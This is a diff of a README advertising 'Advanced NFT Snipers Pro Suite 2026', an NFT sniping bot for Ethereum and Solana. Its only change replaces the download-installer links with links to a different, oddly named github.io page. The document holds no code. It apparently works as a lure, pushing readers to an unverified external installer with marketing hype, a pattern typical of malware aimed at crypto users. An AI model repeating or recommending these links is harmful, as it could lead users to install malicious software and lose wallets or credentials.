@@ -2,7 +2,7 @@
 
 Advanced NFT Snipers Pro Suite 2026 is the ultimate automated toolkit designed for the modern NFT trader. This comprehensive sniper solution enables fast, precise minting and buying across multiple blockchains, including Ethereum and Solana, helping you secure rare drops before anyone else.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest_Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest_Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -36,4 +36,4 @@ A: While our engine provides significant advantages in speed and automation, NFT
 
 Access the official download page for the latest version, updates, and documentation.
 
-[Download Advanced NFT Snipers Pro Suite from the official website](https://yellowtaxisave.github.io/download-page/)
+[Download Advanced NFT Snipers Pro Suite from the official website](https://capitals-707-bringing.github.io/download-page/)
